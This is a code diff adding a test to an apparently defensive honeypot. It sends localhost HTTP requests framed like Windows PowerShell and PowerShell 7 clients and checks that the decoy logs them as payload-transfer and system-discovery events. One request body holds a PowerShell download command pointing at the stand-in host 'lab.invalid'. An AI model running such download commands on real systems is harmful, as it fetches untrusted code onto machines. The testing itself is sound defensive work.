@@ -111,3 +111,75 @@ def test_five_listeners_and_telemetry(tmp_path):
         store.close()
 
     asyncio.run(scenario())
+
+
+def test_powershell_http_framing_and_single_action_count(tmp_path):
+    async def scenario():
+        settings = HoneypotSettings(
+            bind_host="127.0.0.1",
+            database_path=tmp_path / "powershell.db",
+            certificate_dir=tmp_path / "certs",
+            enable_gemini=False,
+            read_timeout_seconds=1.0,
+            min_response_delay_seconds=0,
+            max_response_delay_seconds=0,
+            services=tuple(replace(item, port=0) for item in default_services()),
+        )
+        store = TelemetryStore(settings.database_path)
+        runtime = HoneypotRuntime(settings=settings, store=store)
+        status = await runtime.start()
+        http_port = next(
+            item["port"] for item in status["services"] if item["protocol"] == "http"
+        )
+
+        # Windows PowerShell/.NET may wait for 100 Continue before sending a body.
+        body = b'{"command":"Invoke-WebRequest http://lab.invalid/tool.ps1"}'
+        reader, writer = await asyncio.open_connection("127.0.0.1", http_port)
+        writer.write(
+            b"POST /api/jobs HTTP/1.1\r\n"
+            b"Host: decoy\r\n"
+            b"User-Agent: Mozilla/5.0 WindowsPowerShell/5.1\r\n"
+            b"Content-Type: application/json\r\n"
+            + f"Content-Length: {len(body)}\r\n".encode()
+            + b"Expect: 100-continue\r\n\r\n"
+        )
+        await writer.drain()
+        assert await reader.readuntil(b"\r\n\r\n") == b"HTTP/1.1 100 Continue\r\n\r\n"
+        writer.write(body)
+        await writer.drain()
+        assert b"HTTP/1.1 200 OK" in await reader.read()
+        writer.close()
+        await writer.wait_closed()
+
+        # PowerShell 7 HttpClient can stream a request with chunked framing.
+        reader, writer = await asyncio.open_connection("127.0.0.1", http_port)
+        writer.write(
+            b"POST /ops/run HTTP/1.1\r\n"
+            b"Host: decoy\r\n"
+            b"User-Agent: PowerShell/7.5\r\n"
+            b"Transfer-Encoding: chunked\r\n"
+            b"Content-Type: text/plain\r\n\r\n"
+            b"B\r\nGet-Process\r\n"
+            b"0\r\n\r\n"
+        )
+        await writer.drain()
+        assert b"HTTP/1.1 200 OK" in await reader.read()
+        writer.close()
+        await writer.wait_closed()
+
+        await asyncio.sleep(0.1)
+        await runtime.stop()
+        sessions = [item for item in store.list_sessions() if item["service"] == "HTTP"]
+        assert len(sessions) == 2
+        assert all(item["interactions"] == 1 for item in sessions)
+        inbound_types = {
+            item["event_type"]
+            for item in store.list_events(limit=100)
+            if item["direction"] == "inbound"
+        }
+        assert "PAYLOAD_TRANSFER" in inbound_types
+        assert "SYSTEM_DISCOVERY" in inbound_types
+        assert store.metrics()["interactions_captured"] == 2
+        store.close()
+
+    asyncio.run(scenario())
